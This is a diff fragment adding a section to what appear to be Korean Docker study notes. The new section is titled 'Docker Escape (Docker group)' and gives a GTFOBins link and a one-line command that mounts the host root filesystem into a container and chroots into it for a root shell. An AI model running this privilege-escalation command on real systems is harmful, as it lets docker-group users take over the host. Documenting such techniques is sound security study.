@@ -6,6 +6,13 @@
 | `container` | 이미지(레시피)로 실행한 결과물 (요리) |
 
 ---
+## Docker Escape(Docker group)
+- https://gtfobins.org/gtfobins/docker/
+```bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
+```
+
+---
 ## 이미지 & 컨테이너 조회
 
 ```bash
